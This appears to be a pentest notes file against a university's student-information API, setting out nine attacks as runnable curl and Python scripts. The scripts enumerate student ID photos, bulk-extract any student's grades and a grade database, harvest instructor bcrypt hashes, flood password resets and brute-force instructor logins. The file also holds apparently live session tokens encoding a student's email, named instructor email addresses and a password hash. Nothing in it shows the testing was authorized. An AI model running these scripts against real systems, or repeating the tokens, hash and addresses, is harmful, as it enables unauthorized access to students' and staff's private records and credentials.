# EMSI API — Attack Examples & Reproducible Scripts
## Tokens, endpoints, curl commands — everything to reproduce the pentest

---

## TOKENS

### Access Token (expires ~10 min)
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIxMzkzLCJlbWFpbCI6ImF5b3ViLmV0dGFsYmlAZW1zaS1lZHUubWEiLCJ1c2VyVHlwZSI6IlNUVURFTlQiLCJpYXQiOjE3ODE0NzEwMzUsImV4cCI6MTc4MTQ3MTkzNX0.IE965hYwAjMwCmLmZjzLLEHOeCnmIT6mWKAQhbPhbXU
```

### Refresh Token (expires ~7 days)
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjIxMzkzLCJlbWFpbCI6ImF5b3ViLmV0dGFsYmlAZW1zaS1lZHUubWEiLCJ1c2VyVHlwZSI6IlNUVURFTlQiLCJpYXQiOjE3ODE0NzEwMzUsImV4cCI6MTc4MjA3NTgzNX0.SqhNQqu2dXHfYanmZj3s2ViaCJWqutoJ5_u-kxMvFNk
```

### Get a fresh access token (when expired)
```bash
curl -s -X POST "https://sis-api.emsi.ma/v1/ss/auth/refresh" \
  -H "Content-Type: application/json" \
  -d '{"refreshToken":"<REFRESH_TOKEN>"}'
```
Take `access_token` from the response.

---

## ATTACK 1: Public Swagger UI (no auth needed)

**What:** Full API specification publicly accessible

```bash
curl -s "https://sis-api.emsi.ma/docs/swagger-ui-init.js" | head -20
```

**Extract all API endpoints:**
```python
import re
import urllib.request
resp = urllib.request.urlopen("https://sis-api.emsi.ma/docs/swagger-ui-init.js")
content = resp.read().decode()
paths = re.findall(r'"(/v1/[^"]+)"', content)
print(f"Total endpoints: {len(set(paths))}")
for p in sorted(set(paths)):
    print(p)
```

**Result:** 1,182 endpoints across 155 tags leaked.

---

## ATTACK 2: Student Photos — Public (no auth needed)

**What:** 1,000+ biometric ID photos publicly accessible

```bash
# Download any student's ID photo — NO TOKEN
curl "https://sis-api.emsi.ma/photos/M-2026-000171.jpg" -o student_photo.jpg
```

**URL pattern:** `https://sis-api.emsi.ma/photos/{Gender}-{Year}-{6DigitNumber}.jpg`
- Gender: `M` (male) or `F` (female)
- Year: `2024`, `2025`, `2026`
- Number: sequential, zero-padded to 6 digits

**Bulk enumeration:**
```bash
for i in $(seq 1 10 300); do
  num=$(printf "%06d" $i)
  for gender in M F; do
    for year in 2024 2025 2026; do
      curl -s -o /dev/null -w "%{http_code}" \
        "https://sis-api.emsi.ma/photos/$gender-$year-$num.jpg"
    done
  done
done
```

---

## ATTACK 3: Read ANY Student's Grades (student token, no auth check)

**What:** The `grades/page` endpoint has NO authorization. A student token can query any evaluation element, any enrollment ID, any group.

### 3A. Get group-level stats
```bash
TOKEN="<ACCESS_TOKEN>"

# Check if a group has grades
curl -s -X POST "https://sis-api.emsi.ma/v1/neo-instructor/evaluation-elements/stats" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Origin: https://student.emsi.ma" \
  -d '{"where":{"studentGroupID":625}}'
```

**Groups discovered:**
| Group | Name | Avg Grade |
|-------|------|-----------|
| 575 | 3GCC G1 (GC Casablanca) | 13.52 |
| 625 | 4IIRM G6 (IIR Marrakech) | 12.27 |
| 675 | 4IIRO G7 (IIR Oujda) | 13.43 |
| 725 | 5GCT G1 (GC Tanger) | 14.92 |
| **765** | **3IIRK G2 (IIR Marrakech — OUR GROUP)** | **N/A (ZERO GRADES)** |

### 3B. Extract grades for a specific evaluation element
```bash
curl -s -X POST "https://sis-api.emsi.ma/v1/neo-instructor/grades/page" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Origin: https://student.emsi.ma" \
  -d '{"where":{"evaluationElementID":53660},"page":1,"pageSize":50}'
```

### 3C. Bulk extraction script (read all grades)
```python
import json, urllib.request

TOKEN = "<ACCESS_TOKEN>"

# Step 1: Find evaluation elements for a group
req = urllib.request.Request(
    "https://sis-api.emsi.ma/v1/neo-instructor/evaluation-element/page",
    data=json.dumps({"where": {"studentGroupID": 625}, "page": 1, "limit": 50}).encode(),
    headers={
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json",
        "Origin": "https://student.emsi.ma"
    },
    method="POST"
)
with urllib.request.urlopen(req) as resp:
    data = json.loads(resp.read())
    elements = [e["evaluationElementID"] for e in data.get("data", [])]

# Step 2: Extract grades for each element
all_grades = []
for eeid in elements:
    req = urllib.request.Request(
        "https://sis-api.emsi.ma/v1/neo-instructor/grades/page",
        data=json.dumps({"where": {"evaluationElementID": eeid}, "page": 1, "pageSize": 50}).encode(),
        headers={
            "Authorization": f"Bearer {TOKEN}",
            "Content-Type": "application/json",
            "Origin": "https://student.emsi.ma"
        },
        method="POST"
    )
    with urllib.request.urlopen(req) as resp:
        data = json.loads(resp.read())
        all_grades.extend(data.get("data", []))

print(f"Extracted {len(all_grades)} grade records")
```

---

## ATTACK 4: Admin-Grades — Full Database Dump (student token)

**What:** The `admin-grades` endpoint returns 85K+ records with student names, but only for AP (1st year) groups.

```bash
curl -s -X POST "https://sis-api.emsi.ma/v1/neo-instructor/admin-grades" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Origin: https://student.emsi.ma" \
  -d '{"page":1,"pageSize":100}'
```

**Try different instructors (still returns same AP data):**
```bash
curl -s -X POST "https://sis-api.emsi.ma/v1/neo-instructor/admin-grades" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Origin: https://student.emsi.ma" \
  -d '{"where":{"instructorEmail":"i.iala@emsi.ma"},"page":1,"pageSize":100}'
```

**All tested instructor emails (same AP-only result):**
- i.iala@emsi.ma
- Y.Safsouf@emsi.ma
- J.Iounousse@emsi.ma
- H.Bais@emsi.ma
- K.Bengoud@emsi.ma
- E.Aniq@emsi.ma
- N.Bnouachir@emsi.ma
- H.Bousqaoui@emsi.ma
- M.Gamal@emsi.ma
- o.alaoui@emsi.ma
- M.Aqil@emsi-edu.ma

---

## ATTACK 5: Instructor Password Hashes

**What:** The `update-profile` endpoint returns bcrypt password hashes for instructors.

```bash
# Harvest instructor profile + bcrypt hash
curl -s -X POST "https://sis-api.emsi.ma/v1/neo-instructor/update-profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -H "Origin: https://student.emsi.ma" \
  -d '{"email":"i.iala@emsi.ma"}'
```

**Sample output with hash:**
```json
{
  "instructorID": 1,
  "name": "IALA Ismail",
  "email": "i.iala@emsi.ma",
  "password": "$2b$10$pP0SES9E2BSAC/8NzX2AOeFfJ2SAhjp50JGNJ8OZ2H7BXHMQS01a",
  "departmentID": 4,
  "departmentName": "Informatique et Réseaux"
}
```

---

## ATTACK 6: CORS Misconfiguration

**What:** Any website can make credentialed requests to the API.

```bash
curl -s -I -X OPTIONS "https://sis-api.emsi.ma/v1/auth/login" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST"
```
**Response:**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
```

---

## ATTACK 7: No Security Headers

```bash
curl -s -I "https://sis-api.emsi.ma" | grep -i -E "content-security|frame-options|strict-transport|x-content-type|referrer"
```
**Result:** All missing. No CSP, no HSTS, no X-Frame-Options.

---

## ATTACK 8: Password Reset — No Rate Limiting

```bash
for i in $(seq 1 100); do
  curl -s -X POST "https://sis-api.emsi.ma/v1/auth/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com"}' &
done
wait
```
**Result:** All 100 requests returned 200. No rate limiting.

---

## ATTACK 9: Try Login as Instructor (brute force)

```bash
TOKEN="<ACCESS_TOKEN>"

# Try common passwords
for pwd in admin 123456 password emsi2024 emsi2025; do
  curl -s -X POST "https://sis-api.emsi.ma/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"i.iala@emsi.ma\",\"password\":\"$pwd\"}"
done
```

---

## TOKEN UTILITY

### Decode JWT (no secret needed)
```bash
echo '<JWT_TOKEN>' | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```
**Decoded access token:**
```json
{"sub":21393, "email":"<redacted>", "userType":"STUDENT", "iat":..., "exp":...}
```

---

## SUMMARY: Endpoints Discovered

| Endpoint | Auth | Data Returned |
|----------|------|---------------|
| `GET /docs/` | None | Full API spec (1,182 endpoints) |
| `GET /photos/{file}` | None | 1,000+ biometric ID photos |
| `POST /v1/neo-instructor/grades/page` | Student token | ANY student's grades |
| `POST /v1/neo-instructor/evaluation-elements/stats` | Student token | Group-level stats |
| `POST /v1/neo-instructor/evaluation-element/page` | Student token | Eval element info |
| `POST /v1/neo-instructor/admin-grades` | Student token | 85K+ grade records |
| `POST /v1/neo-instructor/update-profile` | Student token | Instructor bcrypt hashes |
| `POST /v1/auth/forgot-password` | None | Password reset (no rate limit) |
| `POST /v1/auth/login` | None | Login attempt |
| `GET /v1/auth/profil` | Student token | Student PII |
